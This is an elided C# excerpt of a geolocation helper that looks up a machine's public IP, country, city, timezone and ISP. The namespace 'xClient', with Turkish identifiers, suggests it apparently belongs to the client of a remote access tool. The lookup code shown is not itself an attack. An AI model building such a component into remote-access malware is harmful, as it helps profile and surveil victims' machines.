...
namespace xClient.KuuhakuÇekirdek.Yardımcılar
{
    public static class GeoLocationHelper
    {
        ...
        public static CoğrafikBilgi GeoInfo { get; private set; }
        ...
        public static void Initialize()
        {
            ...
            if (lastLocateTry.TotalMinutes > 30 || !LocationCompleted)
            {
                ...
                if (GeoInfo.Ülke_Kodu == "-" || GeoInfo.Ülke == "Bilinmiyor")
                {
                    ImageIndex = 247; 
                    return;
                }
                ...
                {
                    if (ImageList[i].Contains(GeoInfo.Ülke_Kodu.ToLower()))
                    {
                        ImageIndex = i;
                        break;
                    }
        ...
        private static void TryLocate()
        {
            ...
            try
            {
                DataContractJsonSerializer jsonSerializer = new DataContractJsonSerializer(typeof(CoğrafikBilgi));
                ...
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                {
                    using (Stream dataStream = response.GetResponseStream())
                    {
                        using (StreamReader reader = new StreamReader(dataStream))
                        {
                            ...
                            {
                                GeoInfo = (CoğrafikBilgi)jsonSerializer.ReadObject(ms);
                            }
                        }
                    }
                }
        ...
        private static void TryLocateFallback()
        {
                    ...
                    using (Stream dataStream = response.GetResponseStream())
                    {
                        using (StreamReader reader = new StreamReader(dataStream))
                        {
                            ...
                            GeoInfo.Ip = (!string.IsNullOrEmpty(xmlIp))
                                ? xmlIp
                                : "-";
                            GeoInfo.Ülke = (!string.IsNullOrEmpty(xmlCountry))
                                ? xmlCountry
                                : "Unknown";
                            GeoInfo.Ülke_Kodu = (!string.IsNullOrEmpty(xmlCountryCode))
                                ? xmlCountryCode
                                : "-";
                            GeoInfo.Bölge = (!string.IsNullOrEmpty(xmlRegion))
                                ? xmlRegion
                                : "Unknown";
                            GeoInfo.Şehir = (!string.IsNullOrEmpty(xmlCity))
                                ? xmlCity
                                : "Unknown";
                            GeoInfo.SaatDilimi = (!string.IsNullOrEmpty(timeZone))
                                ? timeZone
                                : "Unknown";
            ...
            {
                GeoInfo.Ülke = "Unknown";
                GeoInfo.Ülke_Kodu = "-";
                GeoInfo.Bölge = "Unknown";
                GeoInfo.Şehir = "Unknown";
                GeoInfo.SaatDilimi = "Unknown";
                GeoInfo.Isp = "Unknown";
                LocationCompleted = false;
            }
